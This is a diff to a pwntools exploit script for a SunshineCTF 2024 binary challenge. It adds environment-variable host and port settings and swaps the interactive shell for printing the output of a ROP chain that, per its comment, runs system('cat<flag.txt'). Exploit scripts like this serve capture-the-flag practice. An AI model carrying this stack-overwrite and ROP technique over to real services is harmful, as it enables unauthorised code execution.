@@ -1,12 +1,14 @@
 #!/usr/bin/env python3
 from pwn import *
-import sys
+import sys, os
 
 binary = args.BIN or "attachments/ship.bin"
 context.terminal = ["tmux", "splitw", "-h"]
 e = context.binary = ELF(binary)
 
-if args.REMOTE:
+ENV_HOST = os.environ.get("HOST")
+ENV_PORT = os.environ.get("PORT")
+if args.REMOTE or ENV_HOST:
     TIMEOUT = 0.5
 else:
     TIMEOUT = 0.1
@@ -19,9 +21,9 @@ def get_remote():
     if args.GDB:
         # return gdb.debug(e.path, gdbscript=gs)
         return e.debug(gdbscript=gs)
-    elif args.REMOTE:
-        HOST = args.HOST or "2024.sunshinectf.games"
-        PORT = int(args.PORT or 24003)
+    elif args.REMOTE or ENV_HOST:
+        HOST = ENV_HOST or args.HOST or "2024.sunshinectf.games"
+        PORT = int(ENV_PORT or args.PORT or 24003)
         return remote(HOST, PORT)
     else:
         return process(e.path)
@@ -121,7 +123,8 @@ def throw_sploit():
 
     stack_write(chain,offset)
     end_game()
-    p.interactive()
+    # The ROP chain runs system("cat<flag.txt"); print what the service sends
+    print(p.recvrepeat(3).decode(errors='replace'))
     return True
 
 while True:
